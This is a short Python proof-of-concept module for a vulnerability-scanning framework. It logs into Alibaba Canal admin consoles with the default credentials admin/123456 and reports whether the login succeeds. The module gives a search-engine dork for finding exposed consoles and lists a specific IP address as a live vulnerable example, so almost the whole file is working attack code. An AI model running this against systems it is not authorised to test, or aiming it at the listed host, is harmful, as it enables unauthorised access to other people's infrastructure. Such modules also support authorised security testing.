# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-1-10",        # POC创建时间
        "UpdateDate" : "2022-1-10",        # POC创建时间
        "PocDesc" : """
        
  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Alibaba Canal 默认弱口令漏洞",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Alibaba_Canal",                     # 漏洞应用名称
        "AppVersion" : "无",                  # 漏洞应用版本
        "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Alibaba Canal控制台存在默认口令：admin/123456
        """,                                # 漏洞简要描述

        "fofa-dork":"",  """
            title="Canal Admin"
        """                   # fofa搜索语句
        "example" : "http://47.96.12.221:8089/",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }



    def _verify(self):
        """
        返回vuln
        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  
        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/api/v1/user/login" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json;charset=UTF-8",
                    }
        data = """{"username":"admin","password":"123456"}"""
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.post(url,headers = headers , data = data, proxies = self.proxy , timeout = self.timeout,verify = False)
            if "\"code\":20000,\"message\":null,\"data\"" in req.text and req.status_code == 200 :
                vuln = [True,"Login success: " + req.text]
            else:
                vuln = [False,"Login failed: " + req.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()